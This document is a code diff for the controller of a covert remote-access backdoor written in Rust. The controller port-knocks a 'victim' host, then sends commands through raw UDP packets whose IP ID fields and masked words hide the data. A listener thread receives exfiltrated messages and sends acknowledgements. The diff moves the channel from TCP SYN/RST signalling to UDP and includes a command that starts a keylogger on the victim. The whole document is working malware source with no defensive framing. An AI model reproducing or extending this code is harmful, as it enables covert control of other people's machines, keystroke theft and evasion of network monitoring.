@@ -4,14 +4,13 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
+use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::Packet;
 use pnet::datalink;
-use pnet::packet::tcp::TcpPacket;
 
 mod port_knkr;
-mod keylogger;
+mod keylogger; // Ensure this exists or is accessible
 mod covert;
 
 use port_knkr::KnockSession;
@@ -34,8 +33,8 @@ struct Commander {
     local_ip: Option<Ipv4Addr>,
     knock_session: Option<KnockSession>,
     running: Arc<AtomicBool>,
-    tx_port: u16,
-    rx_port: u16,
+    tx_port: u16, // Where the victim is listening
+    rx_port: u16, // Where we listen for replies
 }
 
 impl Commander {
@@ -51,63 +50,91 @@ impl Commander {
         }
     }
 
-   fn send_covert_data(&self, payload: &[u8]) {
+    fn send_covert_data(&self, payload: &[u8]) {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
-        
         let mut state = covert::SenderState::new_from_bytes(payload);
         
-        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
+        let protocol = Layer3(IpNextHeaderProtocols::Udp);
         let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
         while state.has_next() && self.running.load(Ordering::SeqCst) {
-            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
+            if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
                 let mut acked = false;
                 let mut attempts = 0;
 
                 while !acked && attempts < 5 {
                     attempts += 1;
-                    
-                    let syn_pkt = covert::build_syn_packet(
-                        local_ip, victim_ip,
-                        self.rx_port, self.tx_port, 
-                        ip_id, masked_seq
-                    );
-                    
-                    let _ = tx.send_to(
-                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), 
-                        IpAddr::V4(victim_ip)
-                    );
+                    let pkt = covert::build_udp_sender_packet(local_ip, victim_ip, self.rx_port, self.tx_port, ip_id, masked_word);
+                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&pkt).unwrap(), IpAddr::V4(victim_ip));
 
                     let start = std::time::Instant::now();
                     while start.elapsed() < Duration::from_millis(800) {
                         if let Ok((packet, _)) = rx_iter.next() {
-                            if packet.get_source() == victim_ip {
-                                if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
-                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
-                                    if recv_id == expected_sig {
-                                        state.ack();
-                                        acked = true;
-                                        break;
-                                    }
-                                }                                
+                            if let Some(recv_sig) = covert::parse_udp_ack_signature(packet.packet()) {
+                                if recv_sig == covert::signature_ip_id(ip_id, raw_word) {
+                                    state.ack();
+                                    acked = true;
+                                    break;
+                                }
                             }
                         }
                     }
-                    
-                    if !acked {
-                        println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
-                    }
                 }
-
-                if !acked {
-                    println!("[!!!] Connection lost. Aborting command.");
-                    return;
+                if !acked { 
+                    println!("[!] Failed to send chunk after 5 attempts");
+                    return; 
                 }
             }
         }
-        println!("[+] Command sent successfully.");
+    }
+
+    fn spawn_listener(&self) {
+        let running = self.running.clone();
+        let target_ip = self.victim_ip.unwrap();
+        let local_ip = self.local_ip.unwrap();
+        let rx_port = self.rx_port;
+        let tx_port = self.tx_port;
+
+        thread::spawn(move || {
+            let protocol = Layer3(IpNextHeaderProtocols::Udp);
+            let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
+            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
+            let mut receiver_state = covert::ReceiverState::new();
+
+            while running.load(Ordering::SeqCst) {
+                if let Ok((packet, _)) = rx_iter.next() {
+                    if packet.get_source() == target_ip {
+                        if let Some(parsed) = covert::parse_udp_data_from_ipv4(packet.packet()) {
+                            if parsed.dst_port == rx_port {
+                                let unmasked = covert::unmask_word(parsed.masked_word, parsed.ip_id);
+                                if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
+                                    
+                                    // Send ACK back to victim
+                                    let ack_params = covert::UdpAckParams {
+                                        src_ip: local_ip,
+                                        dst_ip: target_ip,
+                                        src_port: rx_port,
+                                        dst_port: tx_port,
+                                        ip_id_signature: sig_id,
+                                    };
+                                    let ack_pkt = covert::build_udp_ack_packet(&ack_params);
+                                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(), IpAddr::V4(target_ip));
+
+                                    if receiver_state.complete {
+                                        if let Ok(msg) = receiver_state.message_str() {
+                                            println!("\n[Incoming] {}", msg);
+                                        }
+                                        receiver_state = covert::ReceiverState::new();
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        });
     }
 
     pub fn run(&mut self) {
@@ -156,8 +183,8 @@ impl Commander {
         match port_knkr::port_knock(ip) {
             Ok(session) => {
                 self.victim_ip = Some(ip);
-                self.tx_port = session.tx_port;
-                self.rx_port = session.rx_port;
+                self.tx_port = session.tx_port; // Port on Victim
+                self.rx_port = session.rx_port; // Port on Commander
                 self.knock_session = Some(session);
                 
                 if let Some((_, local_v4)) = Self::find_interface_for_target(ip) {
@@ -169,7 +196,7 @@ impl Commander {
                 self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
                 self.spawn_listener(); 
-                println!("[+] Session Established. Derived Ports -> TX: {}, RX: {}", self.tx_port, self.rx_port);
+                println!("[+] Knock Active. Ports -> Target Listener (TX): {}, Local Listener (RX): {}", self.tx_port, self.rx_port);
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
@@ -180,45 +207,14 @@ impl Commander {
         for iface in &interfaces {
             for ip_net in &iface.ips {
                 if let IpAddr::V4(local_v4) = ip_net.ip() {
-                    if ip_net.contains(IpAddr::V4(target)) {
+                    // Check if target is in the same subnet or if it's loopback
+                    if ip_net.contains(IpAddr::V4(target)) || local_v4.is_loopback() {
                         return Some((iface.name.clone(), local_v4));
                     }
                 }
             }
         }
         None
-    }
-
-    fn spawn_listener(&self) {
-        let running = self.running.clone();
-        let target_ip = self.victim_ip.unwrap();
-        let rx_port = self.rx_port;
-
-        thread::spawn(move || {
-            let protocol = Layer3(IpNextHeaderProtocols::Tcp);
-            let (_, mut rx) = transport_channel(65535, protocol).expect("Root required");
-            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
-            let mut receiver_state = covert::ReceiverState::new();
-
-            while running.load(Ordering::SeqCst) {
-                if let Ok((packet, _)) = rx_iter.next() {
-                    if packet.get_source() == target_ip {
-                        if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
-                            if parsed.dst_port == rx_port {
-                                if let Ok(_) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                                    if receiver_state.complete {
-                                        if let Ok(msg) = receiver_state.message_str() {
-                                            println!("\n[Incoming] {}", msg);
-                                        }
-                                        receiver_state = covert::ReceiverState::new();
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        });
     }
 
     fn start_keylogger(&mut self) { self.send_covert_data(&[CMD_START_LOGGER]); }
